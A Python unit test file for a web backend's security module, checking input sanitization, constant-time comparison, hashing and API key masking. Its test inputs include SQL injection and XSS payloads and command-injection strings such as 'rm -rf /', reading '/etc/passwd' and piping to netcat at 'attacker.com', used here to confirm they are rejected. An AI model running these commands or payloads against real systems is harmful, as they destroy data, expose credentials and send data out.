"""
Unit Tests for Security Module

Tests input sanitization and security features.

Author: Shenzhen Wang & AI
License: MIT
"""
import pytest
from backend.security import (
    sanitize_input,
    constant_time_compare,
    hash_sensitive_data,
    mask_api_key
)


class TestInputSanitization:
    """Test input sanitization"""
    
    def test_valid_input(self):
        """Test that valid input passes through"""
        text = "A warrior swings a sword"
        result = sanitize_input(text)
        assert result == text
    
    def test_sql_injection_detected(self):
        """Test SQL injection detection"""
        malicious_inputs = [
            "test'; DROP TABLE users; --",
            "SELECT * FROM users",
            "UNION SELECT password FROM users",
            "INSERT INTO users VALUES ('hacker')",
        ]
        
        for input_text in malicious_inputs:
            with pytest.raises(ValueError, match="SQL injection"):
                sanitize_input(input_text)
    
    def test_xss_detected(self):
        """Test XSS detection"""
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img onerror='alert(1)'>",
            "<div onclick='evil()'>",
        ]
        
        for input_text in malicious_inputs:
            with pytest.raises(ValueError, match="XSS"):
                sanitize_input(input_text)
    
    def test_command_injection_detected(self):
        """Test command injection detection"""
        malicious_inputs = [
            "test && rm -rf /",
            "test; cat /etc/passwd",
            "test | nc attacker.com 1234",
            "../../../etc/passwd",
        ]
        
        for input_text in malicious_inputs:
            with pytest.raises(ValueError, match="command injection"):
                sanitize_input(input_text)


class TestSecurityHelpers:
    """Test security helper functions"""
    
    def test_constant_time_compare_equal(self):
        """Test constant-time comparison with equal strings"""
        assert constant_time_compare("secret123", "secret123") == True
    
    def test_constant_time_compare_different(self):
        """Test constant-time comparison with different strings"""
        assert constant_time_compare("secret123", "secret456") == False
    
    def test_constant_time_compare_different_length(self):
        """Test constant-time comparison with different lengths"""
        assert constant_time_compare("short", "muchlonger") == False
    
    def test_hash_sensitive_data(self):
        """Test hashing sensitive data"""
        data = "sensitive-api-key-12345"
        hashed = hash_sensitive_data(data)
        
        # Should be 16 characters (truncated SHA256)
        assert len(hashed) == 16
        
        # Should be consistent
        assert hashed == hash_sensitive_data(data)
        
        # Different data should have different hash
        assert hashed != hash_sensitive_data("different-data")
    
    def test_mask_api_key(self):
        """Test API key masking"""
        # Long key
        key = "sk-1234567890abcdefghij"
        masked = mask_api_key(key)
        assert masked == "sk-1...ghij"
        
        # Short key
        short_key = "abc"
        masked_short = mask_api_key(short_key)
        assert masked_short == "***"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
